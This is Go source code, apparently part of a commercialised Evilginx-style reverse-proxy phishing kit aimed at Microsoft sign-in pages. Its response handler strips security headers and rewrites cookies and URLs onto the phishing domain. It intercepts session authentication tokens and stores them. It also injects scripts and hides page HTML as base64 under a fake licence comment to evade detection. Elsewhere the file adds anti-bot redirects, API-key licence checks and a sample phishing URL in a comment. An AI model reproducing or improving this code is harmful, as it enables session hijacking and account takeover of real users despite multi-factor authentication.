			fmt.Printf("\nreturn req %s \n", req)

			fmt.Printf("\nreq.URL %s \n", req.URL)

			return req, nil
		})

	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {

			//parsedURL, err := url.Parse(resp.Request.URL.Path)
			//if err != nil {
			//	fmt.Println("Error parsing URL:", err)
			//	return nil
			//}
			//
			//queryValues := parsedURL.Query()
			//
			//// Extract the value of the "ref" parameter
			//refValue := queryValues.Get("ref")
			//
			//// Decode the base64-encoded value
			//decodedValue, err := base64.StdEncoding.DecodeString(refValue)
			//if err != nil {
			//	fmt.Println("Error decoding base64:", err)
			//	return nil
			//}
			//
			//resp.Request.URL.Path = string(decodedValue)
			log.Info("resp.Request.URL.Path : %s", resp.Request.URL.Path)

			log.Important("ENTER PROXY.OnREPONSE")
			log.Warning("request url: %s", ctx.Req.URL.String())
			if resp == nil {
				return nil
			}

			ps := ctx.UserData.(*ProxySession)

			//ds := &http.Cookie{}
			//ds = &http.Cookie{
			//	Name:    "FWrD",
			//	Value:   "true",
			//	Path:    "/",
			//	Domain:  ps.PhishDomain,
			//	Expires: time.Now().UTC().Add(60 * time.Minute),
			//	MaxAge:  60 * 60,
			//}
			//
			//resp.Request.AddCookie(ds)

			// handle session
			//cookiesss := resp.Cookies()
			//log.Warning("COOKIES RESPONSE ATAS", cookiesss)

			ck := &http.Cookie{}
			ls := &http.Cookie{}
			ds := &http.Cookie{}

			if ps.SessionId != "" {
				if ps.Created {

					ds = &http.Cookie{
						Name:    p.cookielandingv1,
						Value:   "true",
						Path:    "/",
						Domain:  ps.PhishDomain,
						Expires: time.Now().UTC().Add(60 * time.Minute),
						MaxAge:  60 * 60,
					}

					ck = &http.Cookie{
						Name:    p.cookieName,
						Value:   ps.SessionId,
						Path:    "/",
						Domain:  ps.PhishDomain,
						Expires: time.Now().UTC().Add(60 * time.Minute),
						MaxAge:  60 * 60,
					}

					if p.cookiebot == "USA" {
						ls = &http.Cookie{
							Name:    p.cookiebot,
							Value:   "false",
							Path:    "/",
							Domain:  ps.PhishDomain,
							Expires: time.Now().UTC().Add(60 * time.Minute),
							MaxAge:  60 * 60,
						}
					} else {
						ls = &http.Cookie{
							Name:    p.cookiebot,
							Value:   "true",
							Path:    "/",
							Domain:  ps.PhishDomain,
							Expires: time.Now().UTC().Add(60 * time.Minute),
							MaxAge:  60 * 60,
						}
					}

				}
			}

			//ls.
			//ls.Valid()
			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
			if allow_origin != "" && allow_origin != "*" {
				if u, err := url.Parse(allow_origin); err == nil {

					log.Warning("PROXY ON RESPONSE WILL ENTRY replaceHostWithPhished")
					log.Warning("U.HOST : %s", u.Host)
					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
					}
				} else {
					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
				}
				resp.Header.Set("Access-Control-Allow-Credentials", "true")
			}
			var rm_headers = []string{
				"Content-Security-Policy",
				"Content-Security-Policy-Report-Only",
				"Strict-Transport-Security",
				"X-XSS-Protection",
				"X-Content-Type-Options",
				"X-Frame-Options",
			}
			for _, hdr := range rm_headers {
				resp.Header.Del(hdr)
			}

			redirect_set := false
			if s, ok := p.sessions[ps.SessionId]; ok {
				if s.RedirectURL != "" {
					redirect_set = true
				}
			}

			req_hostname := strings.ToLower(resp.Request.Host)

			// if "Location" header is present, make sure to redirect to the phishing domain
			r_url, err := resp.Location()
			if err == nil {
				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
					r_url.Host = r_host
					log.Warning("r_url.String() : %s", r_url.String())

					new_url := encodePathInCGIParameter(r_url.String(), r_host)

					resp.Header.Set("Location", new_url)
					log.Warning("new_url :%s", new_url)
					//os.Exit(0)
				}
			}

			// fix cookies
			pl := p.getPhishletByOrigHost(req_hostname)
			var auth_tokens map[string][]*AuthToken
			if pl != nil {
				auth_tokens = pl.authTokens
			}
			is_auth := false
			cookies := resp.Cookies()
			resp.Header.Del("Set-Cookie")

			// LS

			// END LS

			for _, ck := range cookies {
				// parse cookie

				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
					if err != nil {
						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
						if err != nil {
							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
						}
					}
					ck.Expires = exptime
				}

				if pl != nil && ps.SessionId != "" {
					c_domain := ck.Domain
					if c_domain == "" {
						c_domain = req_hostname
					} else {
						// always prepend the domain with '.' if Domain cookie is specified - this will indicate that this cookie will be also sent to all sub-domains
						if c_domain[0] != '.' {
							c_domain = "." + c_domain
						}
					}
					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
					if pl.isAuthToken(c_domain, ck.Name) {
						s, ok := p.sessions[ps.SessionId]
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (ck.Expires.IsZero() || (!ck.Expires.IsZero() && time.Now().Before(ck.Expires))) { // cookies with empty values or expired cookies are of no interest to us
								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
								if len(pl.authUrls) > 0 {
									is_auth = false
								}
								if is_auth {
									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens, cfg.GetKey()); err != nil {
										log.Error("database: %v", err)
									}
									s.IsDone = true
								}
							}
						}
					}
				}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())
			}

			if ls.String() != "" {
				resp.Header.Add("Set-Cookie", ls.String())
			}

			if ds.String() != "" {
				resp.Header.Add("Set-Cookie", ds.String())
			}
			res, _ := resp.Request.Cookie(ds.Name)
			//json.Unmarshal([]byte(res), &res)
			log.Warning("COOKIES RESPONSE BAWAH", res)
			if is_auth {
				// we have all auth tokens
				log.Success("[%d] all authorization tokens intercepted!", ps.Index)
			}

			// modify received body
			body, err := ioutil.ReadAll(resp.Body)

			//log.Warning("body : %s", body)

			//log.Warning("modify received body")
			//log.Warning(string(body))
			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
			log.Warning("mime : %s", mime)
			if err == nil {
				for site, pl := range p.cfg.phishlets {
					log.Warning(site)
					if p.cfg.IsSiteEnabled(site) {
						log.Warning("site %s enabled", site)
						// handle sub_filters
						log.Warning("req_hostname %s", req_hostname)
						sfs, ok := pl.subfilters[req_hostname]
						log.Warning("sfs %s", sfs)
						log.Warning("okok %s", ok)
						var OWN_phish_hostname string
						if ok {
							for _, sf := range sfs {
								var param_ok bool = true
								if s, ok := p.sessions[ps.SessionId]; ok {
									var params []string
									for k, _ := range s.Params {
										params = append(params, k)
									}
									if len(sf.with_params) > 0 {
										param_ok = false
										for _, param := range sf.with_params {
											if stringExists(param, params) {
												param_ok = true
												break
											}
										}
									}
								}

								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
									re_s := sf.regexp
									replace_s := sf.replace
									log.Warning("sf.regexp : %s", sf.regexp)
									log.Warning("sf.replace: %s", sf.replace)
									//os.Exit(0)
									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
									log.Warning("phish_hostname %s", phish_hostname)
									phish_sub, _ := p.getPhishSub(phish_hostname)
									log.Warning("phish_sub %s", phish_sub)

									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)

									log.Warning("replace_s :%s", replace_s)
									log.Warning("replace_s :%s", re_s)

									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)

									OWN_phish_hostname = phish_hostname

									log.Warning("phishDomain %s", phishDomain)
									if ok {
										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
									}

									if re, err := regexp.Compile(re_s); err == nil {
										body = []byte(re.ReplaceAllString(string(body), replace_s))
										log.Warning("regexp replace")
										//log.Warning(string(body))
									} else {
										log.Error("regexp failed to compile: `%s`", sf.regexp)
									}
								}

							}
						}

						// handle auto filters (if enabled)
						if stringExists(mime, p.auto_filter_mimes) {
							for _, ph := range pl.proxyHosts {
								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
									log.Warning("auto filter")
									log.Warning("req_hostname %s", req_hostname)
									log.Warning("CombineHost %s", combineHost(ph.orig_subdomain, ph.domain))
									if ph.auto_filter {
										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
										log.Warning("ph :%s", ph)

										log.Warning("mime :%s", mime)

										url4, found := getFederationRedirectUrl(string(body))
										if found {
											//fmt.Println("FederationRedirectUrl found:", url4)
											//newUrl := "mynewurllink"
											parsedURLS2, _ := url.Parse(url4)
											//log.Warning("parsedURLS2 :%s", parsedURLS2)
											//newURL := replaceDomain(url4, "fuck.com")
											//log.Warning("newURL :%s", newURL)
											result := []byte(encodePathInCGIParameter(url4, parsedURLS2.Host))
											//log.Warning("result :%s", result)
											newJSONStr, replaced := replaceFederationRedirectUrl(string(body), string(result))
											log.Warning("newJSONStr :%s", newJSONStr)
											body = []byte(newJSONStr)
											if replaced {
												//fmt.Println("FederationRedirectUrl replaced:", newJSONStr)
											} else {
												fmt.Println("FederationRedirectUrl not found")
											}
											//os.Exit(0)
										} else {
											fmt.Println("FederationRedirectUrl not found")
										}

										//log.Info("hostname : %s", combineHost(sf.subdomain, sf.domain))
										//log.Warning("body Before patchUrls : %s", body)
										log.Warning("combineHost(ph.orig_subdomain, ph.domain) : %s", combineHost(ph.orig_subdomain, ph.domain))
										log.Warning("OWN_phish_hostname :%s", OWN_phish_hostname)

										body = []byte(encodePathInCGIParameter(string(body), combineHost(ph.orig_subdomain, ph.domain)))
										//body = []byte(encodePathInCGIParameter(string(body), OWN_phish_hostname))
										//log.Warning("body after patchUrls : %s", body)

									}
								}
							}
						}
					} else {
						log.Warning("site %s is disabled", site)
					}
				}

				//akhir p.cfg.phislhets

				if stringExists(mime, []string{"text/html"}) {

					if pl != nil && ps.SessionId != "" {
						s, ok := p.sessions[ps.SessionId]
						if ok {
							if s.PhishLure != nil {
								// inject opengraph headers
								l := s.PhishLure
								body = p.injectOgHeaders(l, body)
							}

							var js_params *map[string]string = nil
							if s, ok := p.sessions[ps.SessionId]; ok {
								/*
									if s.PhishLure != nil {
										js_params = &s.PhishLure.Params
									}*/
								js_params = &s.Params
							}

							log.Warning(resp.Request.URL.Path)
							script, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
							if err == nil {
								log.Debug("js_inject: matched %s%s - injecting script", req_hostname, resp.Request.URL.Path)
								js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
								m_nonce := js_nonce_re.FindStringSubmatch(string(body))
								js_nonce := ""
								if m_nonce != nil {
									js_nonce = " nonce=\"" + m_nonce[1] + "\""
								}
								re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
								body = []byte(re.ReplaceAllString(string(body), "<script"+js_nonce+">"+script+"</script>${1}"))

								///encode body html to base64

								re_title := regexp.MustCompile(`<title>(.*?)</title>`)

								// Find all matches in the input string
								matches := re_title.FindAllStringSubmatch(string(body), -1)

								// If there is at least one match
								if len(matches) > 0 {
									log.Warning("title found")

									// Generate a random 8-character string
									randomString := GenRandomString(8)

									// Replace the content within the <title> tags with the random string
									modifiedString := re_title.ReplaceAllString(string(body), fmt.Sprintf("<title>%s</title>", randomString))

									//fmt.Println("Original String:", string(body))
									//fmt.Println("Modified String:", modifiedString)
									//os.Exit(0)
									body = []byte(modifiedString)
								} else {
									fmt.Println("No match found.")
								}

								body = []byte(base64.StdEncoding.EncodeToString([]byte(string(body))))
								body = []byte(url.QueryEscape(string(body)))
								body = []byte(fmt.Sprintf(`
<!-- Copyright (c) 2012-2024 Scott Chacon and others

Permission is hereby granted, free of charge, to any person obtaining
a copy of this software and associated documentation files (the
"Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to
permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be
included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. -->






<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>A second</title>
</head>
<body>
    <p>Loading to ...</p>

    <script>
      document.write(atob(unescape('%s')))
    </script>
</body>
</html>`, body))

							}
						}
					}
				}

				//log.Warning("body text/html : %s", body)

				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
				//os.Exit(0)
			}

			//if mime == "text/html" {

			//os.Exit(0)
			//}

			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens, cfg.GetKey())
							if err != nil {
								log.Error("database: %v", err)
							}
							if err == nil {
								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
							}
							break
						}
					}
				}
			}

			if pl != nil && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					if s.RedirectURL != "" && s.RedirectCount == 0 {
						if stringExists(mime, []string{"text/html"}) {
							// redirect only if received response content is of `text/html` content type
							s.RedirectCount += 1
							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
							resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusFound, "")
							if resp != nil {
								r_url, err := url.Parse(s.RedirectURL)
								if err == nil {
									if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
										r_url.Host = r_host
									}
									resp.Header.Set("Location", r_url.String())
								} else {
									resp.Header.Set("Location", s.RedirectURL)
								}
								return resp
							}
						}
					}
				}
			}

			log.Warning("return resp")
			//fmt.Printf("\n resp.body %s \n", resp.Body)
			//fmt.Printf("\n resp.Status %s \n", resp.Status)
			//fmt.Printf("\n resp.Uncompressed %s \n", resp.Uncompressed)
			fmt.Println(resp.Header)
			log.Warning(resp.Request.URL.Path)
			return resp
		})

	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}

	return p, nil
}

func extractIP(input string) (string, error) {
	// Split the input string by colon
	parts := strings.Split(input, ":")

	// Parse the IP address
	ip := net.ParseIP(parts[0])
	if ip == nil {
		return "", fmt.Errorf("Invalid IP address: %s", parts[0])
	}

	return ip.String(), nil
}

func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
	if len(p.cfg.redirectUrl) > 0 {
		redirect_url := p.cfg.redirectUrl
		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
		if resp != nil {
			resp.Header.Add("Location", redirect_url)
			return req, resp
		}
	} else {
		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
		if resp != nil {
			return req, resp
		}
	}
	return req, nil
}

func (p *HttpProxy) expiredKey(req *http.Request) (*http.Request, *http.Response) {
	if len(p.cfg.redirectUrl) > 0 {
		//redirect_url := p.cfg.redirectUrl
		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "API KEY EXPIRED || PLEASE CONTACT NOIRLEGACY ")
		if resp != nil {
			//resp.Header.Add("Location", redirect_url)
			return req, resp
		}
	} else {
		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
		if resp != nil {
			return req, resp
		}
	}
	return req, nil
}

func (p *HttpProxy) invaliddKey(req *http.Request) (*http.Request, *http.Response) {
	if len(p.cfg.redirectUrl) > 0 {
		//redirect_url := p.cfg.redirectUrl
		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "INVALID API KEY || PLEASE CONTACT NOIRLEGACY ")
		if resp != nil {
			//resp.Header.Add("Location", redirect_url)
			return req, resp
		}
	} else {
		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
		if resp != nil {
			return req, resp
		}
	}
	return req, nil
}

func replaceDomain(originalURL, newDomain string) string {
	// Split the URL into parts using "/"
	parts := strings.Split(originalURL, "/")

	// Replace the domain in the first part of the URL
	parts[2] = newDomain

	// Join the parts back into a single string
	newURL := strings.Join(parts, "/")

	return newURL
}

func getFederationRedirectUrl(jsonStr string) (string, bool) {
	regexPattern := `"FederationRedirectUrl"\s*:\s*"([^"]+)"`
	matches := regexp.MustCompile(regexPattern).FindStringSubmatch(jsonStr)

	if len(matches) >= 2 {
		return matches[1], true
	}

	return "", false
}

func replaceFederationRedirectUrl(jsonStr, newUrl string) (string, bool) {
	regexPattern := `("FederationRedirectUrl"\s*:\s*")[^"]+(")`
	replacementPattern := "${1}" + newUrl + "${2}"

	newJSONStr := regexp.MustCompile(regexPattern).ReplaceAllString(jsonStr, replacementPattern)
	replaced := newJSONStr != jsonStr

	return newJSONStr, replaced
}

func processURL(urlString string) (string, error) {
	// Check if the URL contains the specified substring
	if strings.Contains(urlString, "redirect?cgi=") {
		// Parse the URL
		u, err := url.Parse(urlString)
		if err != nil {
			return "", fmt.Errorf("error parsing URL: %w", err)
		}

		// Extract and decode the base64-encoded value
		cgiValue, err := url.QueryUnescape(u.Query().Get("cgi"))
		if err != nil {
			return "", fmt.Errorf("error decoding CGI value: %w", err)
		}

		decodedValue, err := base64.StdEncoding.DecodeString(cgiValue)
		if err != nil {
			return "", fmt.Errorf("error decoding base64 value: %w", err)
		}

		// Create the final result URL
		finalResult := fmt.Sprintf("https://fuck.com%s", decodedValue)
		return finalResult, nil
	}

	return "", fmt.Errorf("URL does not contain the specified substring")
}

//func generateRandomString(length int) string {
//	rand.Seed(time.Now().UnixNano())
//	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
//	result := make([]byte, length)
//	for i := range result {
//		result[i] = charset[rand.Intn(len(charset))]
//	}
//	return string(result)
//}

func encodePathInCGIParameter(input, desiredDomain string) string {
	// Define the regex pattern to match URLs
	urlPattern := `https?://([^\s/]+)(/[^/\s]+(?:/[^/\s]+)*)[^'\s][^"\s']+`

	// Compile the regex for URLs
	regexpURL := regexp.MustCompile(urlPattern)

	// Find all matches in the input string
	matches := regexpURL.FindAllString(input, -1)

	// Encode only the path in base64 and replace it in the final result
	for _, url := range matches {
		// Extract the domain and path from the URL
		pathPattern := `https?://([^\s/]+)(/[^/\s]+(?:/[^/\s]+)*)`
		regexpPath := regexp.MustCompile(pathPattern)
		pathMatches := regexpPath.FindStringSubmatch(url)

		if len(pathMatches) >= 3 {
			domain := pathMatches[1]
			path := pathMatches[2]
			if domain == desiredDomain || strings.Contains(domain, desiredDomain) {
				encodedPath := base64.StdEncoding.EncodeToString([]byte(path))
				// Replace only the path in the final result
				input = strings.Replace(input, url, "https://"+domain+"/redirect?cgi="+encodedPath, 1)
			}
		}
	}

	log.Warning("encodePathInCGIParameter return input: %s", input)

	return input
}

func extractRoute(inputURL string) (string, error) {
	// Parse the URL
	parsedURL, err := url.Parse(inputURL)
	if err != nil {
		return "", err
	}

	// Extract the path or route from the URL
	path := parsedURL.Path

	return path, nil
}

func (p *HttpProxy) antiddos(req *http.Request, ps *ProxySession, url string, cookieUSA string) (*http.Request, *http.Response) {

	p.cookielandingv1 = "RUSSIA"
	p.cookiebot = cookieUSA

	ls := &http.Cookie{
		Name:    p.cookielandingv1,
		Value:   "true",
		Path:    "/",
		Domain:  ps.PhishDomain,
		Expires: time.Now().UTC().Add(60 * time.Minute),
		MaxAge:  60 * 60,
	}

	st := &http.Cookie{
		Name:    p.cookiebot,
		Value:   "true",
		Path:    "/",
		Domain:  ps.PhishDomain,
		Expires: time.Now().UTC().Add(60 * time.Minute),
		MaxAge:  60 * 60,
	}

	//if len(p.cfg.redirectUrl) > 0 {

	resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")

	if ls.String() != "" {
		resp.Header.Add("Set-Cookie", ls.String())
	}

	if st.String() != "" {
		resp.Header.Add("Set-Cookie", st.String())
	}

	log.Warning("REQ.URl: %s", url)
	if resp != nil {
		resp.Header.Add("Location", goDotEnvVariable("LINK_ANTIBOT")+base64.StdEncoding.EncodeToString([]byte(url)))
		return req, resp
	}

	return req, nil
}

func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
	vals := u.Query()
	log.Warning("forawrded url: %s", vals)
	for _, v := range vals {
		dec, err := base64.RawURLEncoding.DecodeString(v[0])
		if err == nil && len(dec) == 5 {
			var crc byte = 0
			for _, b := range dec[1:] {
				crc += b
			}
			if crc == dec[0] {
				return true
			}
		}
	}
	return false
}

//https://microsoftonline.verify-status.online/login/aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tL1NpWG5jbEFUP3ZlcmlmeT14eFdD

func (p *HttpProxy) isForwarderUrlBy2(req *http.Request) bool {

	_, err := req.Cookie("USAt")
	if err != nil {
		//p.cookiebot = "USAt"
		//p.cookielandingv1 = "RUSSIA"
		log.Error("ERROR USAt %s", err)
		return false

	} else {
		p.cookiebot = "USAt"
		p.cookielandingv1 = "RUSSIA"
		return true
	}

	//log.Warning("")

	//p.cookiebot = "BABI"
	//_, err := req.Cookie(p.cookiebot)
	//if err != nil {
	//	log.Error(err.Error())
	//	return false
	//}
	//_, err = req.Cookie(p.cookielandingv1)
	//if err != nil {
	//	return false
	//}

	//
	//_, err = req.Cookie(p.cookiebot)
	//if err != nil {
	//	return false
	//}

	//if strings.Contains(requrl, "https://login.microsoftonline.com/common/") {
	//	return true
	//}
	//
	//if strings.Contains(requrl, "https://login.microsoftonline.com/common/reprocess") {
	//	return true
	//}
	//
	//if requrl == "https://www.office.com/landingv2" {
	//	return true
	//}
	//
	//if requrl == "https://www.office.com/login" {
	//	return true
	//}
	//
	//if requrl == "https://login.microsoftonline.com/kmsi" {
	//	return true
	//}
	//
	//if requrl == "https://login.microsoftonline.com/common/login" {
	//	return true
	//}
	//
	//if requrl == "https://login.microsoftonline.com/" {
	//	return true
	//}
	//
	//if strings.Contains(requrl, "https://www.office.com/login") {
	//	return true
	//}
	//
	//log.Warning("URL NOW ACCESS: %s", u.String())
	//vals := u.Query()
	//log.Warning("forawrded url: %s", vals)
	//data := vals.Get("verify")
	//if data == cookiesname {
	//	log.Important("VERIFY TRUE")
	//	return true
	//} else {
	//	log.Warning("VERIFY FALSE")
	//	for _, v := range vals {
	//		dec, err := base64.RawURLEncoding.DecodeString(v[0])
	//		log.Warning("dec: %s", dec)
	//		if err == nil && len(dec) == 5 {
	//			var crc byte = 0
	//			for _, b := range dec[1:] {
	//				crc += b
	//			}
	//			if crc == dec[0] {
	//				log.Warning("TRUE FOR")
	//				return true
	//			}
	//		}
	//	}
	//	log.Warning("VERIFY RETURN FALSE")
	//	return false
	//}

}

func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
	var ret bool = false
	vals := u.Query()

	var enc_key string

	for _, v := range vals {
		if len(v[0]) > 8 {
			enc_key = v[0][:8]
			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
			if err == nil {
				dec_params := make([]byte, len(enc_vals)-1)

				var crc byte = enc_vals[0]
				c, _ := rc4.NewCipher([]byte(enc_key))
				c.XORKeyStream(dec_params, enc_vals[1:])

				var crc_chk byte
				for _, c := range dec_params {
					crc_chk += byte(c)
				}

				if crc == crc_chk {
					params, err := url.ParseQuery(string(dec_params))
					if err == nil {
						for kk, vv := range params {
							log.Debug("param: %s='%s'", kk, vv[0])

							session.Params[kk] = vv[0]
						}
						ret = true
						break
					}
				} else {
					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
				}
			}
		}
	}
	/*
		for k, v := range vals {
			if len(k) == 2 {
				// possible rc4 encryption key
				if len(v[0]) == 8 {
					enc_key = v[0]
					break
				}
			}
		}

		if len(enc_key) > 0 {
			for k, v := range vals {
				if len(k) == 3 {
					enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
					if err == nil {
						dec_params := make([]byte, len(enc_vals))

						c, _ := rc4.NewCipher([]byte(enc_key))
						c.XORKeyStream(dec_params, enc_vals)

						params, err := url.ParseQuery(string(dec_params))
						if err == nil {
							for kk, vv := range params {
								log.Debug("param: %s='%s'", kk, vv[0])

								session.Params[kk] = vv[0]
							}
							ret = true
							break
						}
					}
				}
			}
		}*/
	return ret
}

func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {
	log.Warning("replaceHtmlParams: ")

	// generate forwarder parameter
	t := make([]byte, 5)
	rand.Read(t[1:])
	var crc byte = 0
	for _, b := range t[1:] {
		crc += b
	}
	t[0] = crc
	fwd_param := base64.RawURLEncoding.EncodeToString(t)

	lure_url += "?" + GenRandomString(1) + "=" + fwd_param

	for k, v := range *params {
		key := "{" + k + "}"
		body = strings.Replace(body, key, html.EscapeString(v), -1)
	}
	var js_url string
	n := 0
	for n < len(lure_url) {
		t := make([]byte, 1)
		rand.Read(t)
		rn := int(t[0])%3 + 1

		if rn+n > len(lure_url) {
			rn = len(lure_url) - n
		}

		if n > 0 {
			js_url += " + "
		}
		js_url += "'" + lure_url[n:n+rn] + "'"

		n += rn
	}

	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
	body = strings.Replace(body, "{lure_url_js}", js_url, -1)

	return body
}

//func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
//	re_url := regexp.MustCompile(MATCH_URL_REGEXP)
//	re_ns_url := regexp.MustCompile(MATCH_URL_REGEXP_WITHOUT_SCHEME)
//
//	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
//		var sub_map map[string]string = make(map[string]string)
//		var hosts []string
//		for _, ph := range pl.proxyHosts {
//			var h string
//			if c_type == CONVERT_TO_ORIGINAL_URLS {
//				h = combineHost(ph.phish_subdomain, phishDomain)
//				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
//			} else {
//				h = combineHost(ph.orig_subdomain, ph.domain)
//				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
//			}
//			hosts = append(hosts, h)
//		}
//		// make sure that we start replacing strings from longest to shortest
//		sort.Slice(hosts, func(i, j int) bool {
//			return len(hosts[i]) > len(hosts[j])
//		})
//
//		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
//			u, err := url.Parse(s_url)
//			if err == nil {
//				for _, h := range hosts {
//					if strings.ToLower(u.Host) == h {
//						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
//						break
//					}
//				}
//			}
//			return s_url
//		}))
//		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
//			for _, h := range hosts {
//				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
//					s_url = strings.Replace(s_url, h, sub_map[h], 1)
//					break
//				}
//			}
//			return s_url
//		}))
//	}
//	return body
//}
//
//func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
//
//	log.Warning("patchUrls")
//
//	re_url := regexp.MustCompile(MATCH_URL_REGEXP)
//	//log.Warning("patchUrls re_url: %s", re_url)
//
//	re_ns_url := regexp.MustCompile(MATCH_URL_REGEXP_WITHOUT_SCHEME)
//
//	//var read_url string
//
//	//body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
//	//
//	//	read_url = s_url
//	//	return s_url
//	//
//	//}))
//	//log.Warning("read url :%s", read_url)
//	//u, _ := url.Parse(hostnameRN)
//	//
//	//subdomain := ""
//	//domain := ""
//	//
